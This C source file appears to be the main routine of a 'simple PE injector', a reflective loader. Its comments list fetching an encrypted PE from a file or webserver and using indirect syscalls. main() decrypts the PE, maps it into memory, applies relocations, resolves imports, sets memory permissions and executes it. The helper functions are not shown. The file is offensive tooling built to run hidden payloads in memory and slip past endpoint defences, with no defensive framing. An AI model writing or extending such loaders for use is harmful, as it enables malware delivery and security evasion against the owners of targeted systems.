#include "main.h"
#include "structs.h"


/*-------------------------------------
  A simple PE injector
  Features:
  - Read the PE from file      - DONE
  - Use indirect syscalls      - DONE
  - Able to run EXE or DLL     - DONE
  - Read the PE from webserver - DONE
  - Make use of encrypted PE   - DONE
-------------------------------------*/

NTCONF g_NtConfig = { 0 };
SC_FUNC g_Fun = { 0 };



int main()
{
	CONTENT cnt = { 0 };
	PEHDRS PeHdrs = { 0 };
	PBYTE pPeBase = NULL;

	//Initialize syscalls
	if (!InitSyscls()) {
		DEBUG_PRINT("[!] Failed to initialize syscalls\n");
		return 1;
	}


	if (!GetPE(&cnt)) {
		DEBUG_PRINT("[!] Failed getting the PE\n");
		return 1;
	}

	if (!Decrypt(&cnt)) {
		DEBUG_PRINT("[!] PE Decryption failed\n");
		return 1;
	}

	if (!InitPE(&PeHdrs, cnt)) {
		DEBUG_PRINT("[!] Failed parsing PE headers\n");
		return 1;
	}


	pPeBase = PreparePE(&PeHdrs);
	if (pPeBase == NULL) {
		DEBUG_PRINT("[!] Something failed\n");
		return 1;
	}

	if (!ApplyRelocations(PeHdrs.pRelocDir, pPeBase, PeHdrs.pNtHeaders->OptionalHeader.ImageBase)) {
		DEBUG_PRINT("[!] Failed applying relocations\n");
		return 1;
	}

	if (!FixImports(PeHdrs.pImportDir, pPeBase)) {
		DEBUG_PRINT("[!] Failed fixing the Import Table\n");
		return 1;
	}

	if (!FixMem(pPeBase, PeHdrs.pNtHeaders, PeHdrs.pSectHeader)) {
		DEBUG_PRINT("[!] Failed fixing memory permissions\n");
		return 1;
	}

	PrepareArgs((LPSTR)PE_ARGS);

	if (!Execute(pPeBase, &PeHdrs, NULL)) {
		DEBUG_PRINT("[!] Execution failed\n");
		return 1;
	}


    return 0;
}
